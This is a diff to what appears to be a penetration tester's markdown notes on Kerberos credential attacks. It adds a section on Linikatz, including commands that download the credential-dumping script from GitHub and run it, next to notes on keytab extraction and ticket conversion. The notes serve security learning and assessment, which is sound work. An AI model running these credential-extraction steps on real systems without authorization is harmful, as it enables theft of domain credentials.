@@ -460,7 +460,11 @@ $ python3 keytabextract.py /home/julia/julia.keytab
 > (KeyTab files can contain multiple credentials for multiple users, and/or different hash types)
 
 #### Extracting credentials on Linux using Linikatz
-
+[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool in the same vein as [[Mimikatz]] but for domain-joined linux systems.
+```sh
+$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+$ /opt/linikatz.sh
+```
 
 ### Converting tickets between OS's
 The [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) can be used to transform `ccache` file from linux to windows, OR `kirbi` files from windows to linux.
